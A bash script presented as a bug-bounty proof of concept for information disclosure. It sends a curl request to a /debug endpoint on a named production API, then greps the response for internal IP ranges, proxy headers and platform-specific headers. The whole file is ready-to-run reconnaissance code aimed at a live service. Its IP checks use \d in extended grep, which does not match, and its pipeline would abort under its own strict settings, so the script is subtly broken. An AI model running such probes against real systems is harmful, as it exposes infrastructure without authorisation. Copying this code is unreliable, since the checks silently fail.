#!/bin/bash
# Fly.io Bug Bounty - PoC for HIGH-01
# Information Disclosure via /debug endpoint
# Author: Fikri Aziz Fadzoli
# Date: 2026-11-18

set -euo pipefail

TARGET="https://api.fly.io/debug"
OUTPUT_DIR="flyio_poc_output"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)

echo "[+] Fly.io HIGH-01 PoC - /debug endpoint information disclosure"
echo "[+] Target: $TARGET"
echo "[+] Output: $OUTPUT_DIR/"
echo ""

mkdir -p "$OUTPUT_DIR"

echo "[+] Fetching /debug endpoint..."
curl -sSL \
  -H "User-Agent: Mozilla/5.0 (Fly.io Bug Bounty PoC)" \
  "$TARGET" \
  -o "$OUTPUT_DIR/debug_raw_${TIMESTAMP}.html" \
  -w "\n[+] HTTP Status: %{http_code}\n[+] Response Time: %{time_total}s\n[+] Content Length: %{size_download} bytes\n"

echo "[+] Extracting sensitive headers..."
grep -E "Fly-|X-Forwarded|Via:|Host:" "$OUTPUT_DIR/debug_raw_${TIMESTAMP}.html" | head -30 > "$OUTPUT_DIR/sensitive_headers_${TIMESTAMP}.txt"

echo "[+] Sensitive headers found:"
cat "$OUTPUT_DIR/sensitive_headers_${TIMESTAMP}.txt"

echo ""
echo "[+] Checking for internal IP disclosure (RFC 1918)..."
if grep -qE "172\.(1[6-9]|2[0-9]|3[0-1])\.\d+\.\d+" "$OUTPUT_DIR/sensitive_headers_${TIMESTAMP}.txt"; then
    echo "[!] INTERNAL IP RANGE EXPOSED: 172.16.0.0/12 detected"
    grep -E "172\.(1[6-9]|2[0-9]|3[0-1])\.\d+\.\d+" "$OUTPUT_DIR/sensitive_headers_${TIMESTAMP}.txt"
fi

if grep -qE "10\.\d+\.\d+\.\d+" "$OUTPUT_DIR/sensitive_headers_${TIMESTAMP}.txt"; then
    echo "[!] INTERNAL IP RANGE EXPOSED: 10.0.0.0/8 detected"
    grep -E "10\.\d+\.\d+\.\d+" "$OUTPUT_DIR/sensitive_headers_${TIMESTAMP}.txt"
fi

if grep -qE "192\.168\.\d+\.\d+" "$OUTPUT_DIR/sensitive_headers_${TIMESTAMP}.txt"; then
    echo "[!] INTERNAL IP RANGE EXPOSED: 192.168.0.0/16 detected"
    grep -E "192\.168\.\d+\.\d+" "$OUTPUT_DIR/sensitive_headers_${TIMESTAMP}.txt"
fi

echo ""
echo "[+] Checking for Fly.io specific sensitive headers..."
SENSITIVE_HEADERS=(
    "Fly-Src:"
    "Fly-Src-Signature:"
    "Fly-Request-Id:"
    "Fly-Traceparent:"
    "Fly-Tracestate:"
    "Fly-Client-Ip:"
    "Fly-Forwarded-Ssl:"
    "X-Request-Start:"
)

for hdr in "${SENSITIVE_HEADERS[@]}"; do
    if grep -q "$hdr" "$OUTPUT_DIR/sensitive_headers_${TIMESTAMP}.txt"; then
        echo "[!] SENSITIVE: $hdr found"
        grep "$hdr" "$OUTPUT_DIR/sensitive_headers_${TIMESTAMP}.txt" | head -2
    fi
done

echo ""
echo "[+] Counting proxy hops (Via header)..."
VIA_COUNT=$(grep -o "1.1 fly.io" "$OUTPUT_DIR/sensitive_headers_${TIMESTAMP}.txt" | wc -l)
echo "[+] Proxy hops detected: $VIA_COUNT"

if [ "$VIA_COUNT" -gt 1 ]; then
    echo "[!] MULTIPLE PROXY HOPS: Internal infrastructure topology exposed"
fi

echo ""
echo "[+] Proof of concept complete."
echo "[+] Files saved to $OUTPUT_DIR/:"
ls -la "$OUTPUT_DIR/"

echo ""
echo "[+] CVSS 4.0: 7.5 (AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N)"
echo "[+] CWE-200: Exposure of Sensitive Information to an Unauthorized Actor"